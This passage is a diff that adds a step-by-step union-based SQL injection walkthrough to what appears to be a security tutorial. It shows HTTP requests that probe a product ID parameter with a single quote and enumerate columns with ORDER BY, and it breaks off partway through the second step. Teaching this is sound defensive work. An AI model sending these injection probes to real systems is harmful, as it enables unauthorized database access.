@@ -86,3 +86,21 @@ Union-based SQL injection leverages the UNION SQL operator to combine results fr
 
 Continue from Example Step-by-step
 
+
+# In-Band SQL Injection: Error-Based and Union-Based - Continued
+
+## Union-Based SQL Injection Step-by-Step Example
+
+Let's walk through a complete example of exploiting a union-based SQL injection:
+
+1. **Identify vulnerable parameter**:
+   ```http
+   GET /products?id=1' HTTP/1.1
+   ```
+   If this returns a database error, the parameter may be vulnerable.
+
+2. **Determine number of columns**:
+   Method 1 (ORDER BY):
+   ```http
+   GET /products?id=1 ORDER BY 1-- HTTP/1.1
+   GET /products?id=1 ORDER BY 2-- HTTP/1
